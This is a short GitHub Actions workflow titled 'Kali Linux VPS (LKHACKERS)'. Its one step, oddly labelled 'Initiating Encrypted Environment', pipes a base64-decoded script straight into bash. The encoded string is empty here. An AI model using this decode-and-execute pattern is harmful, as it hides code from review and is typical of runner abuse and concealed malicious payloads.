# lkhacker
name: Kali Linux VPS (LKHACKERS)

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Initiating Encrypted Environment
        run: |
          # මෙහි පහතින් ඇත්තේ ඔබගේ මුල් script එකේ Base64 version එකයි
          echo "" | base64 -d | bash
